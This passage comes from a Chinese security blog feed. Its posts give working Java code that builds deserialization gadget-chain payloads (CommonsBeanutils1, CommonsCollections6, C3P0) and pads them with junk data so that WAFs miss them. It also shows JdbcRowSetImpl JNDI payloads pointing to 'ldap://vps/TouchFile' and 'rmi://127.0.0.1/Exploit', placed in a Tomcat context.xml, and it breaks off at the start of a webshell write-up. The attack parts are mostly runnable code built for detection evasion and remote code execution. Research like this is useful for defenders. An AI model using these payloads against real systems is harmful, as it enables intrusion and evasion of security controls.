org.python.antlr.ast.Str;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] toByteArray(InputStream in) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] classBytes;</span><br><span class="line">        classBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[in.available()];</span><br><span class="line">        in.read(classBytes);</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> classBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bytesToHexString</span><span class="params">(<span class="keyword">byte</span>[] bArray, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer(length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            String sTemp = Integer.toHexString(<span class="number">255</span> &amp; bArray[i]);</span><br><span class="line">            <span class="keyword">if</span> (sTemp.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                sb.append(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            sb.append(sTemp.toUpperCase());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] data = CB1.getPayload();</span><br><span class="line">        String HexString = bytesToHexString(data, data.length);</span><br><span class="line">        System.out.println(HexString.length());</span><br><span class="line">        String payload = <span class="string">&quot;HexAsciiSerializedMap:&quot;</span>+HexString+<span class="string">&quot;:&quot;</span>;</span><br><span class="line">        WrapperConnectionPoolDataSource wrapperConnectionPoolDataSource = <span class="keyword">new</span> WrapperConnectionPoolDataSource();</span><br><span class="line">        wrapperConnectionPoolDataSource.setUserOverridesAsString(payload);</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> C3P0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对Java反序列化数据绕WAF新姿势的补充</title>
      <link href="/2022/02/05/year/2022/2/%E5%AF%B9Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E7%BB%95WAF%E6%96%B0%E5%A7%BF%E5%8A%BF%E7%9A%84%E8%A1%A5%E5%85%85/"/>
      <url>/2022/02/05/year/2022/2/%E5%AF%B9Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E7%BB%95WAF%E6%96%B0%E5%A7%BF%E5%8A%BF%E7%9A%84%E8%A1%A5%E5%85%85/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="对Java反序列化脏数据绕WAF新姿势的补充"><a href="#对Java反序列化脏数据绕WAF新姿势的补充" class="headerlink" title="对Java反序列化脏数据绕WAF新姿势的补充"></a>对Java反序列化脏数据绕WAF新姿势的补充</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>相信大家都看过回忆飘如雪大师傅的一篇文章，<a href="https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ">Java反序列化数据绕WAF之加大量脏数据</a>，在这篇文章当中大师傅提出了通过将gadget加入到集合类型从而可以实现添加脏数据，这里我发现了一个新姿势</p><p>灵感也是来源于回忆飘如雪大师傅的另一篇文章的一个一笔带过的问题上</p><p><img src="/2022/02/05/year/2022/2/%E5%AF%B9Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E7%BB%95WAF%E6%96%B0%E5%A7%BF%E5%8A%BF%E7%9A%84%E8%A1%A5%E5%85%85/1.png"></p><p>这原本是大师傅想来搞gadget探测的方案，但是却失败了，但本着专研的工匠精神，我对这个问题进行了深入的研究，这里顺便对这个问题解读</p><h2 id="为什么这里第一个属性反序列化失败，仍然触发了URLDNS的整个过程"><a href="#为什么这里第一个属性反序列化失败，仍然触发了URLDNS的整个过程" class="headerlink" title="为什么这里第一个属性反序列化失败，仍然触发了URLDNS的整个过程"></a>为什么这里第一个属性反序列化失败，仍然触发了URLDNS的整个过程</h2><p>顺便这里多提一嘴，为什么之后大师傅提出的直接将URLDNS中的HashMap的键值对中将key或者value任意替换一个为需要探测的class就可以呢，其实核心原因在于是否能触发之后的hash()函数！</p><p>这里我们调重点来讲，好了我们来看看当产生<code>ClassNotFoundException</code>后，最终在<code>java.io.ObjectInputStream#readSerialData</code>,在抛出异常之后他会去继续调用<code>skipCustomData</code></p><p><img src="/2022/02/05/year/2022/2/%E5%AF%B9Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E7%BB%95WAF%E6%96%B0%E5%A7%BF%E5%8A%BF%E7%9A%84%E8%A1%A5%E5%85%85/2.png"></p><p>这里有个if判断，大概是判断当前是否还在块数据当中，如果是跳到下一个块数据当中，每个块分隔是通过0x78这个字节，因为这个字节是一个块的结尾</p><p><img src="/2022/02/05/year/2022/2/%E5%AF%B9Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E7%BB%95WAF%E6%96%B0%E5%A7%BF%E5%8A%BF%E7%9A%84%E8%A1%A5%E5%85%85/3.png"></p><p>接下来是一个switch循环，通过下一字节来判断，这里如果都不是则会直接对下一段进行反序列化！！！很神奇吧</p><p><img src="/2022/02/05/year/2022/2/%E5%AF%B9Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E7%BB%95WAF%E6%96%B0%E5%A7%BF%E5%8A%BF%E7%9A%84%E8%A1%A5%E5%85%85/4.png"></p><p>因此现在我们就能解释为什么当初对于，这一段代码我们能够成功触发URLDNS的反序列化过程呢，没错就是上面这张图，他直接对下一个块数据继续执行反序列化因此对HashMap的反序列化最终导致URLDNS完整触发</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Object&gt; a = <span class="keyword">new</span> LinkedList&lt;Object&gt;();</span><br><span class="line">a.add(makeClass(<span class="string">&quot;TargetClass&quot;</span>));</span><br><span class="line">a.add(<span class="keyword">new</span> URLDNS.getObject(<span class="string">&quot;http://test.dnslog.cn&quot;</span>));</span><br></pre></td></tr></table></figure><p>那么为什么这样却能实现需求呢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap ht = <span class="keyword">new</span> HashMap();</span><br><span class="line">URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); </span><br><span class="line">ht.put(u,我是要探测的gadget); </span><br></pre></td></tr></table></figure><p>在这里当调用了<code>K key = (K) s.readObject();</code>由于类不存在抛出异常，之后继续对下一块数据进行反序列化，最终抛出异常后也不可能继续调用下面的<code>value = s.readObjet()</code>了，更别谈通过hash函数最终触发URLDNS，因此最终能够成功</p><p><img src="/2022/02/05/year/2022/2/%E5%AF%B9Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E7%BB%95WAF%E6%96%B0%E5%A7%BF%E5%8A%BF%E7%9A%84%E8%A1%A5%E5%85%85/5.png"></p><h2 id="灵感大发"><a href="#灵感大发" class="headerlink" title="灵感大发"></a>灵感大发</h2><p>既然在抛出<code>ClassNotFoundException</code>后他还会去继续反序列化下一块数据，并且这是个相当于while True的东西🤪！！</p><p><img src="/2022/02/05/year/2022/2/%E5%AF%B9Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E7%BB%95WAF%E6%96%B0%E5%A7%BF%E5%8A%BF%E7%9A%84%E8%A1%A5%E5%85%85/6.png"></p><p>那么我们是不是就可以这样疯狂套娃实现垃圾数据呢？说干就干，当然大家别忘了引入javassist的依赖</p><p>简简单单对CommonsBeanutils1来发测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title">makeClass</span><span class="params">(String clazzName)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        CtClass ctClass = classPool.makeClass(clazzName);</span><br><span class="line">        Class clazz = ctClass.toClass();</span><br><span class="line">        ctClass.defrost();</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        PriorityQueue priorityQueue = CB1.getObject();</span><br><span class="line">        LinkedList linkedList = <span class="keyword">new</span> LinkedList();</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">            sb.append(<span class="string">&quot;e&quot;</span>);</span><br><span class="line">            linkedList.add(makeClass(<span class="string">&quot;woshijiad&quot;</span>+sb));</span><br><span class="line">        &#125;</span><br><span class="line">        linkedList.add(priorityQueue);</span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(linkedList);</span><br><span class="line">        oos.close();</span><br><span class="line">System.out.println(Base64.encode(barr.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/02/05/year/2022/2/%E5%AF%B9Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E7%BB%95WAF%E6%96%B0%E5%A7%BF%E5%8A%BF%E7%9A%84%E8%A1%A5%E5%85%85/7.png"></p><p>当然这里还有一个小坑就是</p><p>大家不要直接像这样，之前makeClass是返回的Class默认是继承序列化借口的，这样就导致虽然也能弹出计算器，但只是因为linkedList对里面的元素循环遍历执行readObject的结果，而不是本篇提出的通过在ClassNotFoundException利用skipCustomData后读取下一块数据执行反序列化利用的过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue priorityQueue = CB1.getObject();</span><br><span class="line">LinkedList linkedList = <span class="keyword">new</span> LinkedList();</span><br><span class="line">StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">sb.append(<span class="string">&quot;e&quot;</span>);</span><br><span class="line">linkedList.add(makeClass(<span class="string">&quot;woshijiad&quot;</span>+sb));</span><br><span class="line">&#125;</span><br><span class="line">linkedList.add(priorityQueue);</span><br><span class="line">ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">oos.writeObject(linkedList);</span><br><span class="line">oos.close();</span><br><span class="line"><span class="comment">//不要同时运行</span></span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">ois.readObject();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化脏数据绕WAF</title>
      <link href="/2022/02/05/year/2022/2/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%84%8F%E6%95%B0%E6%8D%AE%E7%BB%95WAF/"/>
      <url>/2022/02/05/year/2022/2/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%84%8F%E6%95%B0%E6%8D%AE%E7%BB%95WAF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Java反序列化脏数据绕WAF"><a href="#Java反序列化脏数据绕WAF" class="headerlink" title="Java反序列化脏数据绕WAF"></a>Java反序列化脏数据绕WAF</h1><p>平时我们遇到站点的时候偶尔能看到通过大量脏数据绕过waf，当然在java反序列化也可以，实现思路是需要找到一个class可以序列化，它可以把脏数据对象和gadget一起包裹起来，所以我们要找的class，<strong>第一需要实现<code>java.io.Serializable</code>接口，第二可以存储任意对象</strong>，我的第一想法是HashMap因为之前也考虑过，毕竟HashMap在取出key和value的时候，都会对对象进行反序列化</p><p>如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;String, Object&gt; stringObjectHashMap = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">StringBuilder sb=<span class="keyword">new</span> StringBuilder(); <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123; sb.append(<span class="string">&quot;a&quot;</span>); &#125;</span><br><span class="line">stringObjectHashMap.put(String.valueOf(sb),queue);</span><br><span class="line">ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">oos.writeObject(stringObjectHashMap);</span><br><span class="line">oos.close();</span><br></pre></td></tr></table></figure><p>当然后面看到了别人的文章，才发现自己还是考虑的比较少，其实集合类型就很容易符合</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ArrayList</span><br><span class="line">LinkedList</span><br><span class="line">HashMap</span><br><span class="line">LinkedHashMap</span><br><span class="line">TreeMap</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>并且最重要的是还能不断套娃，这里直接搬运网上代码写的很好了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DirtyDataWrapper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> dirtyDataSize; <span class="comment">//脏数据大小</span></span><br><span class="line">    <span class="keyword">private</span> String dirtyData; <span class="comment">//脏数据内容</span></span><br><span class="line">    <span class="keyword">private</span> Object gadget; <span class="comment">// ysoserila gadget对象</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DirtyDataWrapper</span><span class="params">(Object gadget, <span class="keyword">int</span> dirtyDataSize)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.gadget = gadget;</span><br><span class="line">        <span class="keyword">this</span>.dirtyDataSize = dirtyDataSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将脏数据和gadget对象存到集合对象中</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 一个包裹脏数据和gadget对象可序列化对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">doWrap</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Object wrapper = <span class="keyword">null</span>;</span><br><span class="line">        dirtyData = getLongString(dirtyDataSize);</span><br><span class="line">        <span class="keyword">int</span> type = (<span class="keyword">int</span>)(Math.random() * <span class="number">10</span>) % <span class="number">10</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">switch</span> (type)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                List&lt;Object&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;Object&gt;();</span><br><span class="line">                arrayList.add(dirtyData);</span><br><span class="line">                arrayList.add(gadget);</span><br><span class="line">                wrapper = arrayList;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                List&lt;Object&gt; linkedList = <span class="keyword">new</span> LinkedList&lt;Object&gt;();</span><br><span class="line">                linkedList.add(dirtyData);</span><br><span class="line">                linkedList.add(gadget);</span><br><span class="line">                wrapper = linkedList;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                HashMap&lt;String,Object&gt; map = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">                map.put(<span class="string">&quot;a&quot;</span>,dirtyData);</span><br><span class="line">                map.put(<span class="string">&quot;b&quot;</span>,gadget);</span><br><span class="line">                wrapper = map;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                LinkedHashMap&lt;String,Object&gt; linkedHashMap = <span class="keyword">new</span> LinkedHashMap&lt;String,Object&gt;();</span><br><span class="line">                linkedHashMap.put(<span class="string">&quot;a&quot;</span>,dirtyData);</span><br><span class="line">                linkedHashMap.put(<span class="string">&quot;b&quot;</span>,gadget);</span><br><span class="line">                wrapper = linkedHashMap;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                TreeMap&lt;String,Object&gt; treeMap = <span class="keyword">new</span> TreeMap&lt;String, Object&gt;();</span><br><span class="line">                treeMap.put(<span class="string">&quot;a&quot;</span>,dirtyData);</span><br><span class="line">                treeMap.put(<span class="string">&quot;b&quot;</span>,gadget);</span><br><span class="line">                wrapper = treeMap;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> wrapper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生产随机字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> length 随机字符串长度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 随机字符串</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getLongString</span><span class="params">(<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">        String str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">            str += <span class="string">&quot;x&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测试</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Object cc6 = <span class="keyword">new</span> CommonsCollections6().getObject(<span class="string">&quot;raw_cmd:nslookup xxx.dnslog.cn&quot;</span>);</span><br><span class="line">        DirtyDataWrapper dirtyDataFactory = <span class="keyword">new</span> DirtyDataWrapper(cc6,<span class="number">100</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;/tmp/cc6.ser&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(dirtyDataFactory.doWrap());</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然其实不是所有的集合类都适合用于包裹脏数据和gadget，比如<code>LinkedHashSet</code>,<code>HashSet</code>，<code>TreeSet</code>等类就不适合，至于是为什么呢其实道理很简单，这些数据结构都是有序的，这样就会导致一个问题，如果刚好gadget被排列在前面，可能对于waf来说就可能因此检测到我们的一些恶意数据了</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://gv7.me/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of-dirty-data/">Java反序列化数据绕WAF之加大量脏数据 | 回忆飘如雪 (gv7.me)</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jsp新webshell的探索之旅</title>
      <link href="/2022/02/03/year/2022/2/jsp%E6%96%B0webshell%E7%9A%84%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/"/>
      <url>/2022/02/03/year/2022/2/jsp%E6%96%B0webshell%E7%9A%84%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="jsp新webshell的探索之旅"><a href="#jsp新webshell的探索之旅" class="headerlink" title="jsp新webshell的探索之旅"></a>jsp新webshell的探索之旅</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这篇文章记录了我从一个小发现到实现RCE，为了实现更短的webshell，在这之间遇到了一些的新问题到解决，再到最终精简得到一个新的jsp五行Payload构成的webshell的过程</p><h2 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h2><p>在tomcat的扫描中都有对一些配置文件的扫描以及对里面的属性解析赋值的过程，由于之前的一些小发现(这里不多说)，今天下午一个突如其来的crush在我心中出现，我去跟踪了一下解析context.xml的过程</p><p>在<code>org.apache.catalina.startup.ContextConfig#contextConfig</code>中，从这里可以看到defaultContextXml要么从标准上下文，要么则是默认值<code>conf/context.xml</code></p><p><img src="/2022/02/03/year/2022/2/jsp%E6%96%B0webshell%E7%9A%84%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/1.png"></p><p>接下来在解析阶段，在其中的<code>org.apache.tomcat.util.digester.Digester#startElement</code>引起了我的注意</p><p><img src="/2022/02/03/year/2022/2/jsp%E6%96%B0webshell%E7%9A%84%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/2.png"></p><p>这里如果匹配到标签<code>Context</code>或<code>Manager</code>则会去调用<code>org.apache.tomcat.util.digester.SetPropertiesRule#begin</code>,而这个函数中取出属性赋值的地方如下</p><p><img src="/2022/02/03/year/2022/2/jsp%E6%96%B0webshell%E7%9A%84%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/3.png"></p><p>之后通过调用setProperty方法，去调用属性的set方法，具体如下(部分截图)</p><p><img src="/2022/02/03/year/2022/2/jsp%E6%96%B0webshell%E7%9A%84%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/4.png"></p><p>到了这里一个思路就涌现在我脑中，还记得fastJson的第一个payload吗</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">&quot;dataSourceName&quot;:&quot;ldap://vps/TouchFile&quot;, </span><br><span class="line">&quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这不就是都是set的过程</p><p>之后我在contenx.xml中加上</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Manager</span> <span class="attr">className</span>=<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">dataSourceName</span>=<span class="string">&quot;rmi://127.0.0.1/Exploit&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">autoCommit</span>=<span class="string">&quot;true&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Manager</span>&gt;</span></span><br></pre></td></tr></table></figure><p>再次启动tomcat，成功弹出了计算器</p><p><img src="/2022/02/03/year/2022/2/jsp%E6%96%B0webshell%E7%9A%84%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/5.png"></p><h2 id="新的问题"><a href="#新的问题" class="headerlink" title="新的问题"></a>新的问题</h2><p>可是这个利用链过程是在tomcat启动的过程啊，要想彻底解决我们还得去看看它是通过什么函数进行解析，以及我们是否能控制呢</p><p>在<code>org.apache.catalina.startup.ContextConfig#init</code>中，我们看看关键的步骤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> 